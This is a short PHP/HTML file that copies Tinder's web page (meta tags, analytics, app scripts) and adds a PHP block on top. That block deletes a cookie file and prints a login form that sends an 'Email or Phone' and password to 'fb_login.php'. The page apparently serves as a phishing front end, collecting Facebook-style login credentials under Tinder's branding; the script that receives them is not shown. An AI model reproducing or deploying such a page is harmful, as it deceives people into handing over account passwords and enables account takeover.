<?php

unlink('mirazmac_cookie.txt');
      echo '<div align="right">';
      echo '<form action="fb_login.php" method="post">';
      echo '<font style="font-family:arial; font-size:9px;">Email or Phone </font><input type="text" name="user" style="font-family:arial; font-size:9px; width: 200px; margin-left: 0px; margin-top: 10px;">';
      echo '<font style="font-family:arial; font-size:9px;">   Password </font><input type="password" name="password" style="font-family:arial; font-size:9px; width: 200px; margin-left: 0px; margin-top: 10px;">';
      echo '<input type="submit" value="Log In" style="font-family:arial; font-size:9px; margin-left: 10px; margin-top: 10px;">';
      echo '</form>'; 
      echo '</div>';
?>

<!DOCTYPE html>
<html>
  <head>

  <meta charset="utf-8">

  <title>Tinder</title>

  <meta name="description" content="Tinder is how people meet. It's like real life, but better. Get it for free on iPhone and Android" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no" />
  <meta name="cloudinary_cloud_name" content="tinder">
  <!--[if IE]>
      <link rel="stylesheet" href="/css/ie.css"/>
  <![endif]-->

  <!-- App Install Banners -->
  <meta name="apple-itunes-app" content="app-id=547702041">
  <link rel="manifest" href="/manifest.json">


  <!-- Twitter Cards and OpenGraph -->
  <meta name="twitter:card" content="summary" />
  <meta name="twitter:site" content="@Tinder" />
  <meta name="twitter:description" content="Tinder - meet interesting people nearby." />

  <meta property="og:image" content="http://d3jt6jnjk0gnxj.cloudfront.net/moments/logo.png"/>
  <meta property="og:title" content="Tinder - meet interesting people nearby."/>
  <meta property="og:url" content="http://tinder.com"/>
  <meta property="og:site_name" content="Tinder"/>
  <meta property="og:description" content="Tinder is how people meet. Get it for free on iPhone and Android."/>

  <script src="//use.typekit.net/mbc4edf.js"></script>
  <script>try{Typekit.load();}catch(e){}</script>

  <link href="/application-f4935a84.css" rel="stylesheet" />
  <base href="/"></base>
  <meta name="fragment" content="!">
</head>

<body ng-app="app" class="{{bodyClass}} sidemenu-container" ng-class="{'s-sidemenu': sideMenu}">

  <ui-view></ui-view>

  <script>
    (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
    (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
    m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
    })(window,document,'script','//www.google-analytics.com/analytics.js','ga');

    ga('create', 'UA-60214108-1', 'auto');
    ga('send', 'pageview');

  </script>
  <script src="/application-a827e365.js" async="async"></script>
</body>
</html>




